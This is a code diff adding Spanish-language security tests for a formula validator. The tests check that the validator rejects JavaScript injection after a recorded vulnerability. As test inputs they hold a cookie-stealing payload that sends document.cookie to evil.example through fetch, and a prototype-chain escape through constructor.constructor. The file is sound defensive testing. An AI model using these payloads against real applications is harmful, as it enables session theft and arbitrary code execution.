@@ -76,6 +76,69 @@ class TestExtractUnknownFunctionTokens:
             assert name in KNOWN_FUNCTION_ALIASES
 
 
+class TestExtractUnknownFunctionTokensSecurity:
+    """Hallazgo de seguridad 2026-09-29: antes de este cambio, el chequeo
+    solo miraba identificadores ALL-CAPS y dejaba pasar CUALQUIER otro
+    (fetch, document, window, eval, constructor, total suelto sin punto)
+    sin marcarlos -- exactamente lo que el compilador real tampoco filtraba,
+    permitiendo ejecución de JS arbitrario vía new Function(). Ver
+    calculatedColumns.ts::findDisallowedIdentifier para la corrección
+    equivalente del lado del compilador (la barrera real)."""
+
+    def test_fetch_y_document_en_minuscula_se_marcan(self):
+        result = extract_unknown_function_tokens(
+            "(1, fetch('https://evil.example/steal?c=' + document.cookie))"
+        )
+        assert "fetch" in result
+        assert "document" in result
+
+    def test_window_suelto_se_marca(self):
+        assert "window" in extract_unknown_function_tokens("window.location")
+
+    def test_eval_suelto_se_marca(self):
+        assert "eval" in extract_unknown_function_tokens("eval('1')")
+
+    def test_total_suelto_sin_punto_se_marca(self):
+        # total.{{Venta}}/total.Venta son el uso legítimo (scope) y NO se
+        # marcan -- pero un "total" bare (sin punto) es la forma de llegar
+        # al parámetro real de la función compilada y encadenar
+        # .constructor.constructor(...) -- debe marcarse igual que fetch.
+        assert "total" in extract_unknown_function_tokens("total.constructor.constructor('1')()")
+
+    def test_identificador_dentro_de_string_literal_no_se_marca(self):
+        # "hello"/"world" son contenido de un string, no código -- no deben
+        # aparecer como identificadores no reconocidos.
+        assert extract_unknown_function_tokens("IF({{X}} = 'hello world', 1, 0)") == []
+
+    def test_formula_legitima_real_sigue_sin_marcar_nada(self):
+        assert (
+            extract_unknown_function_tokens(
+                "IF(OR(ISBLANK(total.{{Sell In}}), total.{{Sell In}} = 0), 0, "
+                "{{Sell In}} / total.{{Sell In}})"
+            )
+            == []
+        )
+
+
+class TestFormulaValidationResultSecurity:
+    def test_payload_de_exfiltracion_es_invalido(self):
+        result = formula_validation_result(
+            "(1, fetch('https://evil.example/steal?c=' + document.cookie))",
+            ["Venta"],
+        )
+        assert result["valid"] is False
+        assert "fetch" in result["unknown_functions"]
+        assert "document" in result["unknown_functions"]
+
+    def test_prototype_chain_escape_via_total_es_invalido(self):
+        result = formula_validation_result(
+            "total.constructor.constructor('return 1')()",
+            ["Venta"],
+        )
+        assert result["valid"] is False
+        assert "total" in result["unknown_functions"]
+
+
 class TestKnownCalculatedColumnNames:
     def test_columnas_agrupadas_simples(self):
         assert known_calculated_column_names({"groupby": ["causa_nombre", "region"]}) == ["causa_nombre", "region"]
